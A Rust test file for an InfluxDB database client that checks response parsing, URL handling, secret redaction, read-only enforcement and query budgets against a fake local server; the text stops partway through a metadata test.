//! Parser tests, client tests against an in-process fake InfluxDB (HTTP/1.1
//! over TCP, canned replies), and opt-in integration tests against real
//! servers (`INFLUXDB_URL` for v1, `INFLUXDB2_URL` for v2; skipped when unset).

use super::*;
use crate::conn::{Auth, Flow, Sink, base_url};
use crate::csv::CsvTableSink;
use crate::flux::FluxSink;
use crate::influxql::InfluxQlSink;
use dbcrust_core::options::OPT_HARDEN_READ_ONLY;
use rstest::rstest;
use std::net::SocketAddr;
use std::sync::Mutex;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

const CANARY: &str = "canary-token-7f3a9c";

// ---------------------------------------------------------------------------
// A fake InfluxDB
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Default)]
struct Recorded {
    method: String,
    /// Path and query string, as sent.
    target: String,
    headers: Vec<(String, String)>,
    body: String,
}

impl Recorded {
    fn path(&self) -> &str {
        self.target.split('?').next().unwrap_or_default()
    }

    fn header(&self, name: &str) -> Option<&str> {
        self.headers
            .iter()
            .find(|(key, _)| key.eq_ignore_ascii_case(name))
            .map(|(_, value)| value.as_str())
    }

    /// A query-string parameter, percent-decoded.
    fn param(&self, name: &str) -> Option<String> {
        let query = self.target.split_once('?')?.1;
        decode_pairs(query)
            .into_iter()
            .find(|(key, _)| key == name)
            .map(|(_, value)| value)
    }

    /// A parameter of the form body (v1 POST).
    fn form(&self, name: &str) -> Option<String> {
        decode_pairs(&self.body)
            .into_iter()
            .find(|(key, _)| key == name)
            .map(|(_, value)| value)
    }
}

fn decode_pairs(text: &str) -> Vec<(String, String)> {
    text.split('&')
        .filter_map(|pair| pair.split_once('='))
        .map(|(key, value)| (percent_decode(key), percent_decode(value)))
        .collect()
}

fn percent_decode(text: &str) -> String {
    let bytes = text.replace('+', " ").into_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(byte) = u8::from_str_radix(&String::from_utf8_lossy(&bytes[i + 1..i + 3]), 16)
            {
                out.push(byte);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

struct Reply {
    status: u16,
    headers: Vec<(String, String)>,
    body: Vec<u8>,
    delay: Duration,
}

impl Reply {
    fn ok(body: impl Into<Vec<u8>>) -> Self {
        Self {
            status: 200,
            headers: Vec::new(),
            body: body.into(),
            delay: Duration::ZERO,
        }
    }

    fn status(status: u16, body: impl Into<Vec<u8>>) -> Self {
        Self {
            status,
            ..Self::ok(body)
        }
    }

    fn header(mut self, key: &str, value: &str) -> Self {
        self.headers.push((key.to_string(), value.to_string()));
        self
    }

    fn after(mut self, delay: Duration) -> Self {
        self.delay = delay;
        self
    }
}

type Handler = dyn Fn(&Recorded) -> Reply + Send + Sync;

struct FakeInflux {
    addr: SocketAddr,
    requests: Arc<Mutex<Vec<Recorded>>>,
}

impl FakeInflux {
    async fn start(handler: impl Fn(&Recorded) -> Reply + Send + Sync + 'static) -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let requests: Arc<Mutex<Vec<Recorded>>> = Arc::default();
        let handler: Arc<Handler> = Arc::new(handler);
        let log = requests.clone();
        tokio::spawn(async move {
            loop {
                let Ok((mut socket, _)) = listener.accept().await else {
                    return;
                };
                let handler = handler.clone();
                let log = log.clone();
                tokio::spawn(async move {
                    let Some(request) = read_request(&mut socket).await else {
                        return;
                    };
                    log.lock().unwrap().push(request.clone());
                    let reply = handler(&request);
                    if !reply.delay.is_zero() {
                        tokio::time::sleep(reply.delay).await;
                    }
                    let mut head = format!(
                        "HTTP/1.1 {} X\r\nContent-Length: {}\r\nConnection: close\r\n",
                        reply.status,
                        reply.body.len()
                    );
                    for (key, value) in &reply.headers {
                        head.push_str(&format!("{key}: {value}\r\n"));
                    }
                    head.push_str("\r\n");
                    let _ = socket.write_all(head.as_bytes()).await;
                    let _ = socket.write_all(&reply.body).await;
                    let _ = socket.shutdown().await;
                });
            }
        });
        Self { addr, requests }
    }

    fn info(&self, version: u8) -> ConnectionInfo {
        let mut options = std::collections::HashMap::new();
        options.insert("version".to_string(), version.to_string());
        if version == 2 {
            options.insert("org".to_string(), "acme".to_string());
        }
        ConnectionInfo {
            database_type: DatabaseType::InfluxDB,
            host: Some("127.0.0.1".to_string()),
            port: Some(self.addr.port()),
            options,
            ..Default::default()
        }
    }

    fn received(&self) -> Vec<Recorded> {
        self.requests.lock().unwrap().clone()
    }

    fn last(&self) -> Recorded {
        self.received().last().cloned().expect("a request")
    }
}

async fn read_request(socket: &mut tokio::net::TcpStream) -> Option<Recorded> {
    let mut buffer: Vec<u8> = Vec::new();
    let mut chunk = [0u8; 4096];
    let head_end = loop {
        if let Some(at) = buffer.windows(4).position(|w| w == b"\r\n\r\n") {
            break at;
        }
        match socket.read(&mut chunk).await {
            Ok(0) | Err(_) => return None,
            Ok(read) => buffer.extend_from_slice(&chunk[..read]),
        }
    };
    let head = String::from_utf8_lossy(&buffer[..head_end]).into_owned();
    let mut lines = head.split("\r\n");
    let mut first = lines.next()?.split(' ');
    let method = first.next()?.to_string();
    let target = first.next()?.to_string();
    let headers: Vec<(String, String)> = lines
        .filter_map(|line| line.split_once(':'))
        .map(|(key, value)| (key.trim().to_string(), value.trim().to_string()))
        .collect();
    let length: usize = headers
        .iter()
        .find(|(key, _)| key.eq_ignore_ascii_case("content-length"))
        .and_then(|(_, value)| value.parse().ok())
        .unwrap_or(0);
    let mut body = buffer[head_end + 4..].to_vec();
    while body.len() < length {
        match socket.read(&mut chunk).await {
            Ok(0) | Err(_) => break,
            Ok(read) => body.extend_from_slice(&chunk[..read]),
        }
    }
    Some(Recorded {
        method,
        target,
        headers,
        body: String::from_utf8_lossy(&body).into_owned(),
    })
}

// ---------------------------------------------------------------------------
// Canned replies
// ---------------------------------------------------------------------------

const DATABASES: &str = r#"{"results":[{"statement_id":0,"series":[{"name":"databases","columns":["name"],"values":[["_internal"],["telemetry"]]}]}]}"#;

/// A v1 server: `/ping`, the databases, and whatever `query` answers.
fn v1_handler(
    query: impl Fn(&Recorded) -> Reply + Send + Sync + 'static,
) -> impl Fn(&Recorded) -> Reply + Send + Sync + 'static {
    move |request| match request.path() {
        "/ping" => Reply::status(204, "").header("X-Influxdb-Version", "1.8.10"),
        "/query" if request.param("q").as_deref() == Some("SHOW DATABASES") => Reply::ok(DATABASES),
        "/query" => query(request),
        _ => Reply::status(404, "not found"),
    }
}

const FLUX_CSV: &str = "#group,false,false,true,true,false,false,true,true,true\r\n\
#datatype,string,long,dateTime:RFC3339,dateTime:RFC3339,dateTime:RFC3339,double,string,string,string\r\n\
#default,_result,,,,,,,,\r\n\
,result,table,_start,_stop,_time,_value,_field,_measurement,host\r\n\
,,0,2024-01-01T00:00:00Z,2024-01-02T00:00:00Z,2024-01-01T10:00:00Z,12.5,usage,cpu,web-1\r\n\
,,0,2024-01-01T00:00:00Z,2024-01-02T00:00:00Z,2024-01-01T11:00:00Z,13,usage,cpu,web-1\r\n\
,,1,2024-01-01T00:00:00Z,2024-01-02T00:00:00Z,2024-01-01T10:00:00Z,7,usage,cpu,web-2\r\n\
\r\n";

fn v2_handler(
    query: impl Fn(&Recorded) -> Reply + Send + Sync + 'static,
) -> impl Fn(&Recorded) -> Reply + Send + Sync + 'static {
    move |request| match request.path() {
        "/health" => Reply::ok(r#"{"name":"influxdb","status":"pass","version":"v2.7.5"}"#),
        "/api/v2/me" => Reply::ok(r#"{"id":"1","name":"admin"}"#),
        "/api/v2/query" => query(request),
        _ => Reply::status(404, "not found"),
    }
}

fn cells(row: &[Option<String>]) -> Vec<&str> {
    row.iter()
        .map(|cell| cell.as_deref().unwrap_or("<null>"))
        .collect()
}

// ---------------------------------------------------------------------------
// InfluxQL JSON
// ---------------------------------------------------------------------------

#[test]
fn influxql_a_plain_series_is_one_table() {
    let table = influxql::parse(
        r#"{"results":[{"statement_id":0,"series":[{"name":"cpu","columns":["time","host","usage"],
            "values":[["2024-01-01T00:00:00Z","a",1.5],["2024-01-01T00:01:00Z",null,2]]}]}]}"#,
        100,
    )
    .unwrap();
    assert_eq!(table.columns, ["time", "host", "usage"]);
    assert_eq!(cells(&table.rows[0]), ["2024-01-01T00:00:00Z", "a", "1.5"]);
    assert_eq!(
        cells(&table.rows[1]),
        ["2024-01-01T00:01:00Z", "<null>", "2"]
    );
    assert!(!table.truncated);
}

#[test]
fn influxql_group_by_tags_become_columns_and_several_names_a_name_column() {
    let table = influxql::parse(
        r#"{"results":[{"statement_id":0,"series":[
            {"name":"cpu","tags":{"host":"a"},"columns":["time","mean"],"values":[["t1",1]]},
            {"name":"cpu","tags":{"host":"b"},"columns":["time","mean"],"values":[["t1",2]]}]}]}"#,
        100,
    )
    .unwrap();
    assert_eq!(table.columns, ["host", "time", "mean"]);
    assert_eq!(cells(&table.rows[1]), ["b", "t1", "2"]);

    let table = influxql::parse(
        r#"{"results":[{"statement_id":0,"series":[
            {"name":"cpu","columns":["fieldKey","fieldType"],"values":[["usage","float"]]},
            {"name":"mem","columns":["fieldKey","fieldType"],"values":[["free","integer"]]}]}]}"#,
        100,
    )
    .unwrap();
    assert_eq!(table.columns, ["name", "fieldKey", "fieldType"]);
    assert_eq!(cells(&table.rows[1]), ["mem", "free", "integer"]);
}

#[test]
fn influxql_chunked_documents_continue_a_series_and_may_split_anywhere() {
    let doc1 = r#"{"results":[{"statement_id":0,"series":[{"name":"cpu","columns":["time","v"],"values":[["t1",1],["t2",2]],"partial":true}],"partial":true}]}"#;
    let doc2 = r#"{"results":[{"statement_id":0,"series":[{"name":"cpu","columns":["time","v"],"values":[["t3",3]]}]}]}"#;
    let all = format!("{doc1}\n{doc2}\n");
    // Fed one byte at a time: a document cut anywhere is completed later
    let mut sink = InfluxQlSink::new(100);
    for byte in all.as_bytes() {
        sink.feed(&[*byte]).unwrap();
    }
    sink.finish().unwrap();
    let table = sink.into_table();
    assert_eq!(table.rows.len(), 3);
    assert_eq!(cells(&table.rows[2]), ["t3", "3"]);
}

#[test]
fn influxql_stops_at_the_row_budget_across_documents() {
    let doc = |a: i32| {
        format!(
            r#"{{"results":[{{"statement_id":0,"series":[{{"name":"cpu","columns":["v"],"values":[[{a}],[{}]]}}]}}]}}"#,
            a + 1
        )
    };
    let mut sink = InfluxQlSink::new(3);
    assert_eq!(sink.feed(doc(1).as_bytes()).unwrap(), Flow::Continue);
    assert_eq!(sink.feed(doc(3).as_bytes()).unwrap(), Flow::Stop);
    let table = sink.into_table();
    assert_eq!(table.rows.len(), 3);
    assert!(table.truncated);
}

#[test]
fn influxql_errors_are_reported_with_the_servers_text() {
    let error = influxql::parse(r#"{"error":"error parsing query: found DROP"}"#, 10).unwrap_err();
    assert!(
        error
            .to_string()
            .contains("error parsing query: found DROP"),
        "{error}"
    );
    let error = influxql::parse(
        r#"{"results":[{"statement_id":0,"error":"database not found: \"x\""}]}"#,
        10,
    )
    .unwrap_err();
    assert!(error.to_string().contains("database not found"), "{error}");
}

#[test]
fn influxql_an_incomplete_reply_is_an_error() {
    assert!(influxql::parse(r#"{"results":[{"statement_id":0,"ser"#, 10).is_err());
}

#[test]
fn influxql_server_warnings_become_notices_and_a_write_over_get_is_called_out() {
    // What InfluxDB 1.8 answers when a write is sent as GET: it ran anyway
    let table = influxql::parse(
        r#"{"results":[{"statement_id":0,"messages":[{"level":"warning","text":"deprecated use of 'DROP MEASUREMENT mem' in a read only context, please use a POST request instead"}]}]}"#,
        10,
    )
    .unwrap();
    assert_eq!(table.notices.len(), 1);
    assert!(
        table.notices[0].contains("sent over GET and ran it"),
        "{:?}",
        table.notices
    );
    // Other warnings pass through, once
    let table = influxql::parse(
        r#"{"results":[{"statement_id":0,"messages":[{"level":"warning","text":"a"},{"level":"warning","text":"a"}]}]}"#,
        10,
    )
    .unwrap();
    assert_eq!(table.notices, ["a"]);
}

#[test]
fn influxql_several_statements_show_the_first_and_say_so() {
    let table = influxql::parse(
        r#"{"results":[
            {"statement_id":0,"series":[{"name":"a","columns":["x"],"values":[[1]]}]},
            {"statement_id":1},
            {"statement_id":2,"series":[{"name":"b","columns":["y"],"values":[[2]]}]}]}"#,
        10,
    )
    .unwrap();
    assert_eq!(table.columns, ["x"]);
    assert_eq!(table.notices.len(), 1);
    assert!(table.notices[0].contains("1 more statement"));
}

#[test]
fn influxql_an_empty_result_has_no_columns() {
    let table = influxql::parse(r#"{"results":[{"statement_id":0}]}"#, 10).unwrap();
    assert!(table.columns.is_empty() && table.rows.is_empty());
}

#[test]
fn influxql_values_keep_their_json_spelling() {
    let table = influxql::parse(
        r#"{"results":[{"statement_id":0,"series":[{"name":"m","columns":["a","b","c","d"],
            "values":[[9007199254740993,true,"x y",[1,2]]]}]}]}"#,
        10,
    )
    .unwrap();
    assert_eq!(
        cells(&table.rows[0]),
        ["9007199254740993", "true", "x y", "[1,2]"]
    );
}

// ---------------------------------------------------------------------------
// Flux annotated CSV
// ---------------------------------------------------------------------------

#[test]
fn flux_tables_of_one_schema_are_one_table_told_apart_by_the_table_column() {
    let table = flux::parse(FLUX_CSV, 100).unwrap();
    // `result` only says `_result`: hidden. Two tables: `table` is shown.
    assert_eq!(
        table.columns,
        [
            "table",
            "_start",
            "_stop",
            "_time",
            "_value",
            "_field",
            "_measurement",
            "host"
        ]
    );
    assert_eq!(table.rows.len(), 3);
    assert_eq!(
        cells(&table.rows[2]),
        [
            "1",
            "2024-01-01T00:00:00Z",
            "2024-01-02T00:00:00Z",
            "2024-01-01T10:00:00Z",
            "7",
            "usage",
            "cpu",
            "web-2"
        ]
    );
}

#[test]
fn flux_a_single_table_hides_result_and_table() {
    let csv = "#datatype,string,long,dateTime:RFC3339,double\r\n\
#group,false,false,false,false\r\n\
#default,_result,,,\r\n\
,result,table,_time,_value\r\n\
,,0,2024-01-01T00:00:00Z,1\r\n\
,,0,2024-01-01T01:00:00Z,2\r\n";
    let table = flux::parse(csv, 100).unwrap();
    assert_eq!(table.columns, ["_time", "_value"]);
    assert_eq!(table.rows.len(), 2);
}

#[test]
fn flux_blocks_with_other_schemas_are_unioned_and_named_results_stay() {
    let csv = "#datatype,string,long,string\r\n\
#group,false,false,false\r\n\
#default,first,,\r\n\
,result,table,a\r\n\
,,0,x\r\n\
\r\n\
#datatype,string,long,long\r\n\
#group,false,false,false\r\n\
#default,second,,\r\n\
,result,table,b\r\n\
,,0,5\r\n";
    let table = flux::parse(csv, 100).unwrap();
    assert_eq!(table.columns, ["result", "table", "a", "b"]);
    assert_eq!(cells(&table.rows[0]), ["first", "0", "x", "<null>"]);
    assert_eq!(cells(&table.rows[1]), ["second", "0", "<null>", "5"]);
}

#[test]
fn flux_empty_cells_are_null_unless_the_default_row_gives_a_value() {
    let csv = "#datatype,string,long,string,string\r\n\
#group,false,false,true,false\r\n\
#default,_result,,fallback,\r\n\
,result,table,tagged,plain\r\n\
,,0,,\r\n\
,,0,real,\r\n";
    let table = flux::parse(csv, 100).unwrap();
    assert_eq!(table.columns, ["tagged", "plain"]);
    assert_eq!(cells(&table.rows[0]), ["fallback", "<null>"]);
    assert_eq!(cells(&table.rows[1]), ["real", "<null>"]);
}

#[test]
fn flux_quoted_cells_keep_commas_quotes_and_line_breaks() {
    let csv = "#datatype,string,long,string\r\n\
#group,false,false,false\r\n\
#default,_result,,\r\n\
,result,table,msg\r\n\
,,0,\"a, \"\"b\"\"\nsecond line\"\r\n";
    let table = flux::parse(csv, 100).unwrap();
    assert_eq!(cells(&table.rows[0]), ["a, \"b\"\nsecond line"]);
}

#[test]
fn flux_an_error_table_is_a_query_error() {
    let csv = "#datatype,string,string\r\n#group,true,true\r\n#default,,\r\n,error,reference\r\n,\"failed to create physical plan: invalid time bounds\",897\r\n";
    let error = flux::parse(csv, 100).unwrap_err();
    assert!(
        error.to_string().contains("failed to create physical plan"),
        "{error}"
    );
}

#[test]
fn flux_a_reply_without_rows_keeps_its_columns_and_an_empty_body_is_empty() {
    let csv = "#datatype,string,long,double\r\n#group,false,false,false\r\n#default,_result,,\r\n,result,table,_value\r\n";
    let table = flux::parse(csv, 100).unwrap();
    assert_eq!(table.columns, ["_value"]);
    assert!(table.rows.is_empty());
    let table = flux::parse("", 100).unwrap();
    assert!(table.columns.is_empty() && table.rows.is_empty());
}

#[test]
fn flux_stops_at_the_row_budget_and_says_so() {
    let mut csv = String::from(
        "#datatype,string,long,long\r\n#group,false,false,false\r\n#default,_result,,\r\n,result,table,n\r\n",
    );
    for i in 0..50 {
        csv.push_str(&format!(",,0,{i}\r\n"));
    }
    let mut sink = FluxSink::new(10);
    assert_eq!(sink.feed(csv.as_bytes()).unwrap(), Flow::Stop);
    let table = sink.into_table();
    assert_eq!(table.rows.len(), 10);
    assert!(table.truncated);

    // Exactly at the budget with nothing left: not truncated
    let table = flux::parse(&csv, 50).unwrap();
    assert_eq!(table.rows.len(), 50);
    assert!(!table.truncated);
}

#[test]
fn flux_parses_a_reply_fed_in_arbitrary_pieces() {
    let mut sink = FluxSink::new(100);
    for piece in FLUX_CSV.as_bytes().chunks(7) {
        sink.feed(piece).unwrap();
    }
    sink.finish().unwrap();
    assert_eq!(sink.into_table().rows.len(), 3);
}

#[test]
fn v3_csv_keeps_the_column_order_and_reads_empty_cells_as_null() {
    let mut sink = CsvTableSink::new(10);
    sink.feed(b"time,host,cpu\r\n2024-01-01T00:00:00,a,0.5\r\n2024-01-01T00:00:01,,\r\n")
        .unwrap();
    sink.finish().unwrap();
    let table = sink.into_table();
    assert_eq!(table.columns, ["time", "host", "cpu"]);
    assert_eq!(
        cells(&table.rows[1]),
        ["2024-01-01T00:00:01", "<null>", "<null>"]
    );
}

// ---------------------------------------------------------------------------
// URLs, authentication and redaction
// ---------------------------------------------------------------------------

#[rstest]
#[case("influxdb://db.example", 1, "http://db.example:8086")]
#[case("influxdbs://db.example:8087/telemetry", 1, "https://db.example:8087")]
#[case("influxdb2://db.example/bucket?org=acme", 2, "http://db.example:8086")]
#[case("influxdb2s://db.example:443/b?org=acme", 2, "https://db.example:443")]
#[case("influxdb3://db.example/mydb", 3, "http://db.example:8181")]
#[case("influxdb3+https://db.example:8181/mydb", 3, "https://db.example:8181")]
#[case("influxdb://[::1]/db", 1, "http://[::1]:8086")]
fn urls_map_to_endpoints(#[case] url: &str, #[case] version: u8, #[case] base: &str) {
    let info = ConnectionInfo::parse_url(url).unwrap();
    assert_eq!(
        dbcrust_core::database::influxdb_version(&info.options),
        version
    );
    assert_eq!(base_url(&info), base);
}

#[test]
fn the_token_lives_in_the_password_slot_and_authenticates_by_version() {
    let v2 = ConnectionInfo::parse_url(&format!("influxdb2://h/b?org=o&token={CANARY}")).unwrap();
    assert_eq!(v2.password.as_deref(), Some(CANARY));
    assert!(!v2.options.values().any(|v| v == CANARY));
    assert!(matches!(Auth::from_info(&v2), Auth::Token(t) if t == CANARY));

    let v3 = ConnectionInfo::parse_url(&format!("influxdb3://:{CANARY}@h/db")).unwrap();
    assert!(matches!(Auth::from_info(&v3), Auth::Bearer(t) if t == CANARY));

    let v1 = ConnectionInfo::parse_url("influxdb://alice:pw@h/db").unwrap();
    assert!(
        matches!(Auth::from_info(&v1), Auth::Basic { user, password } if user == "alice" && password == "pw")
    );
    let v1_token = ConnectionInfo::parse_url(&format!("influxdb://h/db?token={CANARY}")).unwrap();
    assert!(matches!(Auth::from_info(&v1_token), Auth::Token(t) if t == CANARY));
    let open = ConnectionInfo::parse_url("influxdb://h/db").unwrap();
    assert!(matches!(Auth::from_info(&open), Auth::None));
}

#[test]
fn debug_output_never_shows_the_token_or_password() {
    let info = ConnectionInfo::parse_url(&format!("influxdb2://admin:{CANARY}@h/b?org=o")).unwrap();
    assert!(!format!("{info:?}").contains(CANARY));
    let http = conn::Http::new(&info).unwrap();
    assert!(!format!("{http:?}").contains(CANARY));
    assert!(!format!("{:?}", Auth::from_info(&info)).contains(CANARY));
    let basic = Auth::Basic {
        user: "u".into(),
        password: CANARY.into(),
    };
    assert!(!format!("{basic:?}").contains(CANARY));
    assert!(!info.to_url().contains(CANARY));
}

#[test]
fn v2_needs_an_org_up_front() {
    let info = ConnectionInfo::parse_url("influxdb2://h/b").unwrap();
    let Err(error) = Engine::new(&info) else {
        panic!("a v2 connection without an org must be refused");
    };
    assert!(error.to_string().contains("org"), "{error}");
}

#[test]
fn flux_and_influxql_names_are_quoted_for_their_language() {
    use crate::metadata::{flux_string, influxql_ident};
    assert_eq!(flux_string(r#"a"b\c${x}"#), r#""a\"b\\c\${x}""#);
    assert_eq!(influxql_ident("my \"cpu\"\n"), r#""my \"cpu\"\n""#);
}

// ---------------------------------------------------------------------------
// v1 against the fake server
// ---------------------------------------------------------------------------

#[tokio::test]
async fn v1_connects_authenticates_and_reads_with_get() {
    let server = FakeInflux::start(v1_handler(|_| {
        Reply::ok(
            r#"{"results":[{"statement_id":0,"series":[{"name":"cpu","columns":["time","v"],"values":[["t1",1]]}]}]}"#,
        )
    }))
    .await;
    let mut info = server.info(1);
    info.username = Some("alice".to_string());
    info.password = Some("s3cret".to_string());
    info.database = Some("telemetry".to_string());
    let client = InfluxClient::new(info).await.unwrap();

    let rows = client
        .execute_query("SELECT * FROM cpu WHERE host = 'a b' LIMIT 5;")
        .await
        .unwrap();
    assert_eq!(
        rows,
        vec![
            vec!["time".to_string(), "v".into()],
            vec!["t1".into(), "1".into()]
        ]
    );

    let request = server.last();
    assert_eq!(request.method, "GET");
    assert_eq!(request.path(), "/query");
    assert_eq!(request.param("db").as_deref(), Some("telemetry"));
    assert_eq!(
        request.param("q").as_deref(),
        Some("SELECT * FROM cpu WHERE host = 'a b' LIMIT 5")
    );
    assert_eq!(request.param("chunked").as_deref(), Some("true"));
    // Basic auth in the header, never in the URL
    assert!(
        request
            .header("authorization")
            .unwrap()
            .starts_with("Basic ")
    );
    assert!(!request.target.contains("s3cret"));
    let info = client.get_server_info().await.unwrap();
    assert_eq!(info.server_version, "1.8.10");
    assert_eq!(info.version_major, Some(1));
}

#[tokio::test]
async fn v1_writes_go_as_post_and_read_only_never_sends_them() {
    let server = FakeInflux::start(v1_handler(|request| {
        if request.method == "POST" {
            Reply::ok(r#"{"results":[{"statement_id":0}]}"#)
        } else {
            Reply::status(400, r#"{"error":"statement must be executed with POST"}"#)
        }
    }))
    .await;
    let client = InfluxClient::new(server.info(1)).await.unwrap();
    client
        .execute_query("CREATE DATABASE scratch")
        .await
        .unwrap();
    let request = server.last();
    assert_eq!(request.method, "POST");
    assert_eq!(
        request.form("q").as_deref(),
        Some("CREATE DATABASE scratch")
    );
    assert!(
        request.param("q").is_none(),
        "the statement is in the body, not the URL"
    );

    // SELECT ... INTO is a write too
    client
        .execute_query("SELECT * INTO copy FROM cpu GROUP BY *")
        .await
        .unwrap();
    assert_eq!(server.last().method, "POST");

    let mut info = server.info(1);
    info.options
        .insert(OPT_HARDEN_READ_ONLY.to_string(), "1".to_string());
    let read_only = InfluxClient::new(info).await.unwrap();
    let before = server.received().len();
    let error = read_only
        .execute_query("DROP DATABASE telemetry")
        .await
        .unwrap_err();
    assert!(error.to_string().contains("read-only mode"), "{error}");
    let error = read_only
        .execute_query("SELECT * INTO copy FROM cpu")
        .await
        .unwrap_err();
    assert!(error.to_string().contains("INTO"), "{error}");
    assert_eq!(
        server.received().len(),
        before,
        "nothing reached the server"
    );
}

#[tokio::test]
async fn v1_server_errors_carry_the_servers_message() {
    let server = FakeInflux::start(v1_handler(|_| {
        Reply::status(
            400,
            r#"{"error":"error parsing query: found EOF, expected identifier"}"#,
        )
    }))
    .await;
    let client = InfluxClient::new(server.info(1)).await.unwrap();
    let error = client.execute_query("SELECT FROM").await.unwrap_err();
    let text = error.to_string();
    assert!(
        text.contains("HTTP 400") && text.contains("error parsing query"),
        "{text}"
    );
}

#[tokio::test]
async fn a_rejected_login_is_a_connection_error_without_the_secret() {
    let server = FakeInflux::start(|request| match request.path() {
        "/ping" => Reply::status(204, ""),
        _ => Reply::status(
            401,
            format!(r#"{{"error":"authorization failed for {CANARY}"}}"#),
        ),
    })
    .await;
    let mut info = server.info(1);
    info.username = Some("alice".to_string());
    info.password = Some("wrong".to_string());
    let Err(error) = InfluxClient::new(info).await else {
        panic!("must not connect");
    };
    assert!(
        matches!(error, DatabaseError::ConnectionError(_)),
        "{error:?}"
    );
    assert!(
        error
            .to_string()
            .contains("authentication failed (HTTP 401)"),
        "{error}"
    );
}

#[tokio::test]
async fn an_unreachable_server_is_a_connection_error() {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    drop(listener);
    let info = ConnectionInfo {
        database_type: DatabaseType::InfluxDB,
        host: Some("127.0.0.1".to_string()),
        port: Some(port),
        ..Default::default()
    };
    let Err(error) = InfluxClient::new(info).await else {
        panic!("must not connect");
    };
    assert!(
        matches!(error, DatabaseError::ConnectionError(_)),
        "{error:?}"
    );
    assert!(error.to_string().contains(&port.to_string()), "{error}");
}

#[tokio::test]
async fn a_big_reply_is_cut_at_max_rows_and_flagged() {
    let server = FakeInflux::start(v1_handler(|_| {
        let values: Vec<String> = (0..20_000).map(|i| format!("[\"t{i}\",{i}]")).collect();
        Reply::ok(format!(
            r#"{{"results":[{{"statement_id":0,"series":[{{"name":"cpu","columns":["time","v"],"values":[{}]}}]}}]}}"#,
            values.join(",")
        ))
    }))
    .await;
    let mut info = server.info(1);
    info.options
        .insert("max_rows".to_string(), "100".to_string());
    let client = InfluxClient::new(info).await.unwrap();
    let table = client.execute_limited("SELECT * FROM cpu").await.unwrap();
    assert_eq!(table.rows.len(), 100);
    assert!(table.truncated);
}

#[tokio::test]
async fn the_byte_budget_stops_the_read_and_keeps_the_complete_documents() {
    // A chunked reply: documents of 100 rows, one per line
    let document = |from: usize| {
        let values: Vec<String> = (from..from + 100)
            .map(|i| format!("[\"t{i}\",{i}]"))
            .collect();
        format!(
            r#"{{"results":[{{"statement_id":0,"series":[{{"name":"cpu","columns":["time","v"],"values":[{}],"partial":true}}]}}]}}"#,
            values.join(",")
        )
    };
    let one = document(0).len() + 1;
    let body: String = (0..10).map(|n| document(n * 100) + "\n").collect();
    let server = FakeInflux::start(v1_handler(move |_| Reply::ok(body.clone()))).await;
    let mut info = server.info(1);
    // Two and a half documents fit
    info.options
        .insert("max_bytes".to_string(), (one * 5 / 2).to_string());
    let client = InfluxClient::new(info).await.unwrap();
    let table = client.execute_limited("SELECT * FROM cpu").await.unwrap();
    assert_eq!(table.rows.len(), 200, "the third document was cut mid-way");
    assert!(table.truncated);
}

#[tokio::test]
async fn ctrl_c_abandons_a_slow_query() {
    let server = FakeInflux::start(v1_handler(|_| {
        Reply::ok(r#"{"results":[{"statement_id":0}]}"#).after(Duration::from_secs(30))
    }))
    .await;
    let client = InfluxClient::new(server.info(1)).await.unwrap();
    let flag = Arc::new(std::sync::atomic::AtomicBool::new(false));
    dbcrust_core::database::set_thread_interrupt_flag(Some(flag.clone()));
    let trigger = flag.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(250)).await;
        trigger.store(true, std::sync::atomic::Ordering::Relaxed);
    });
    let started = std::time::Instant::now();
    let error = client.execute_query("SELECT * FROM cpu").await.unwrap_err();
    dbcrust_core::database::set_thread_interrupt_flag(None);
    assert!(error.to_string().contains("interrupted"), "{error}");
    assert!(started.elapsed() < Duration::from_secs(5));
}

#[tokio::test]
async fn v1_metadata_uses_show_statements() {
    let server = FakeInflux::start(v1_handler(|request| {
        let q = request.param("q").unwrap_or_default();
        let body = if q.starts_with("SHOW MEASUREMENTS") {
            r#"{"results":[{"statement_id":0,"series":[{"name":"measurements","columns":["name"],"values":[["cpu"],["mem"]]}]}]}"#
        } else if q.starts_with("SHOW TAG KEYS") {
            r#"{"results":[{"statement_id":0,"series":[{"name":"cpu","columns":["tagKey"],"values":[["host"],["region"]]}]}]}"#
        } else if q.starts_with("SHOW FIELD KEYS") {
            r#"{"results":[{"statement_id":0,"series":[{"name":"cpu","columns":["fieldKey","fieldType"],"values":[["usage","float"],["count","integer"]]}]}]}"#
        } else {
            r#"{"results":[{"statement_id":0}]}"#
        };
        Reply::ok(body)
    }))
    .await;
    let mut info = server.info(1);
    info.database = Some("telemetry".to_string());
    let client = InfluxClient::new(info).await.unwrap();
    let metadata = client.get_metadata_provider();

    assert_eq!(
        metadata.get_schemas().await.unwrap(),
        ["_internal", "telemetry"]
    );
    assert_eq!(metadata.get_tables(None).await.unwrap(), ["cpu", "mem"]);
    assert_eq!(
        metadata.get_columns("cpu", None).await.unwrap(),
        ["time", "host", "region", "usage", "count"]
    );
    let details = metadata
        .get_table_details("my \"cpu\"", None)
        .await
        .unwrap();
    assert_eq!(details.schema, "telemetry");
    let kinds: Vec<(&str, &str)> = details
        .columns
        .iter()
        .map(|c| (c.name.as_str(), c.data_type.as_str()))
        .collect();
    assert_eq!(
        kinds,
        [
            ("time", "timestamp"),
            ("host", "tag (string)"),
            ("region", "tag (string)"),
            ("usage", "field (float)"),
            ("count", "field (integer)")
        ]
    );
    // The measurement name is quoted for InfluxQL
    let queries: Vec<String> = server
        .received()
        .iter()
        .filter_map(|r| r.param("q"))
        .filter(|q| q.starts_with("SHOW TAG KEYS"))
        .collect();
    assert!(
        queries.contains(&r#"SHOW TAG KEYS FROM "my \"cpu\"""#.to_string()),
        "{queries:?}"
    );

    assert_eq!(
        client.list_databases().await.unwrap(),
        vec![
            vec!["name".to_string()],
            vec!["_internal".into()],
            vec!["telemetry".into()]
        ]
    );
    let mut client = client;
    client.connect_to_database("_internal").await.unwrap();
    assert_eq!(client.get_current_database(), "_internal");
    let error = client.connect_to_database("nope").await.unwrap_err();
